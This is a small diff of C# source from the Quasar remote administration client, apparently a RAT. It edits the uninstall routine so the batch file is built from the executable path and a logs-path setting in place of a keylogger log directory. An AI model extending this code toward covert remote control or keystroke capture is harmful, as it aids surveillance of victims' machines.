@@ -1,11 +1,10 @@
 ﻿using Quasar.Client.Config;
-using Quasar.Client.Data;
 using Quasar.Client.IO;
-using Quasar.Client.Utilities;
 using Quasar.Common.Messages;
 using Quasar.Common.Networking;
 using System;
 using System.Diagnostics;
+using System.Windows.Forms;
 
 namespace Quasar.Client.Setup
 {
@@ -18,7 +17,7 @@ namespace Quasar.Client.Setup
                 if (Settings.STARTUP)
                     Startup.RemoveFromStartup();
 
-                string batchFile = BatchFile.CreateUninstallBatch(ClientData.CurrentPath, Keylogger.LogDirectory);
+                string batchFile = BatchFile.CreateUninstallBatch(Application.ExecutablePath, Settings.LOGSPATH);
 
                 if (string.IsNullOrEmpty(batchFile))
                     throw new Exception("Could not create uninstall-batch file");
